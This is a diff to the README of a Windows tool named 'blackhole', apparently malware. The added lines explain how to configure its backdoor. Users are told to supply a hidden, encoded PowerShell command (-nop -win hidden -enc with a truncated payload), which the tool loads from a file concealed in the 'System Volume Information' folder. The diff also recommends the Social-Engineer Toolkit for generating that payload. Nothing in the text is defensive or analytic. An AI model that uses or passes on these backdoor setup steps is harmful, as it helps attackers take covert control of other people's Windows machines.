@@ -1,4 +1,9 @@
 #blackhole: Currently supports windows only.
 
 Quick customization:
-    change consts and defines inside blackhole.hpp
+    change consts and defines inside blackhole.hpp and main.cpp
+    NOTE: If DYNAMIC_SHELL is set to be true, your backdoor should be a single line cmd command
+          (e.g. powershell.exe -nop -win hidden -noni -enc JAAxACAAPQAgACcAJAB)
+          which is going to be loaded from "System Volume Information~\cmd.shell".
+          (Advice: Use setoolkit > Social > Powershell > Alphanumeric )
+
